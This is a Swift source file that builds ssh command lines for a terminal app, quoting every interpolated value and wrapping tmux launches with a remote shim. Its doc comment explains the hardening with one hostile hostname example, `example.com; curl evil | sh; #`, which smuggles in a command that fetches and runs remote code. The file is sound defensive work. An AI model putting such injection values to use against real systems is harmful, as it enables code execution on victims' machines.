import Foundation

public enum SSHCommand {
    /// The shell command line that opens an interactive SSH session for a connection:
    /// `ssh [-p PORT] '[user@]host'`. The port flag is omitted at the default (22), and the
    /// `user@` prefix is dropped when no (non-blank) user is set. Pure — the same string is
    /// used whether the session is launched from a double-click, a menu, or a test.
    ///
    /// **Every interpolated value is single-quoted**, because the result is a *shell* command line
    /// that the terminal executes locally. `host` and `user` used to go in raw, on the reasoning
    /// that the only way to set them was to type them into the connection editor — self-inflicted,
    /// and no worse than typing the same thing at the prompt. iCloud sync (#83) ended that: a
    /// connection record now arrives from another device, so a hostile hostname like
    /// `example.com; curl evil | sh; #` would have been silent local code execution on every Mac
    /// signed into the account. Quoting is the whole fix, and quoting *unconditionally* is the
    /// point — a "does this need escaping?" test is a thing to get wrong later.
    ///
    /// A non-blank `custom` command is folded onto the end as `-t '<custom>'`, forcing a remote
    /// pty so interactive programs (e.g. `tmux new -n dev`) work — this one was always quoted, so
    /// spaces and metacharacters survive both the local launch and ssh's own re-joining of the
    /// remote command.
    ///
    /// When `busyShim` is non-nil *and* `custom` launches tmux, the tmux command is rewritten to
    /// carry the busy-spinner integration into the remote session (#96): it enables tmux's
    /// `allow-passthrough` and installs the shim as a throwaway remote `ZDOTDIR`, so the remote
    /// shell emits OSC 9;4 (DCS-wrapped, via the shim) and tmux forwards it to ghostty. `busyShim`
    /// nil (the default) — or a non-tmux `custom` — leaves the command byte-for-byte unchanged.
    public static func command(host: String, port: Int, user: String?,
                               custom: String? = nil, busyShim: String? = nil) -> String {
        var parts = ["ssh"]
        // `port` is an Int, so it cannot carry a metacharacter and needs no quoting.
        if port != 22 { parts.append("-p \(port)") }
        let trimmedUser = user?.trimmingCharacters(in: .whitespaces) ?? ""
        parts.append(singleQuoted(trimmedUser.isEmpty ? host : "\(trimmedUser)@\(host)"))
        var line = parts.joined(separator: " ")
        guard let raw = custom?.trimmingCharacters(in: .whitespaces), !raw.isEmpty else { return line }
        line += " -t \(singleQuoted(remoteCommand(custom: raw, busyShim: busyShim)))"
        return line
    }

    /// Wrap a value so the shell passes it through as one literal argument. POSIX single quotes
    /// protect everything except a single quote itself, which is closed, escaped and reopened —
    /// the standard `'\''` dance. There is no input this fails to neutralise.
    private static func singleQuoted(_ value: String) -> String {
        "'\(value.replacingOccurrences(of: "'", with: "'\\''"))'"
    }

    /// The command actually run on the remote host. Identity for a plain custom command; for a tmux
    /// launch with busy integration, the passthrough-enabled, shim-installing rewrite.
    private static func remoteCommand(custom: String, busyShim: String?) -> String {
        guard let shim = busyShim, isTmuxInvocation(custom) else { return custom }
        // Base64 keeps the shim (which contains quotes, `$`, ESCs) free of shell metacharacters, so
        // nothing here needs single quotes and the outer single-quote wrapping stays trivial.
        let encoded = Data(shim.utf8).base64EncodedString()
        return "export ZDOTDIR=\"$(mktemp -d)\"; "
            + "printf %s \(encoded) | openssl base64 -d -A > \"$ZDOTDIR/.zshenv\"; "
            + "exec \(passthroughEnabledTmux(custom))"
    }

    private static func isTmuxInvocation(_ custom: String) -> Bool {
        custom == "tmux" || custom.hasPrefix("tmux ")
    }

    /// Prepend tmux's own `set -g allow-passthrough on` to the user's tmux subcommand, chained with
    /// an escaped `\;` so it reaches tmux as a literal command separator. A bare `tmux` (no
    /// subcommand) becomes `new-session` so it still starts and attaches a session.
    private static func passthroughEnabledTmux(_ custom: String) -> String {
        let enable = "tmux \(TmuxPassthrough.allowPassthroughCommand) \\;"
        let rest = String(custom.dropFirst("tmux".count)).trimmingCharacters(in: .whitespaces)
        return rest.isEmpty ? "\(enable) new-session" : "\(enable) \(rest)"
    }
}
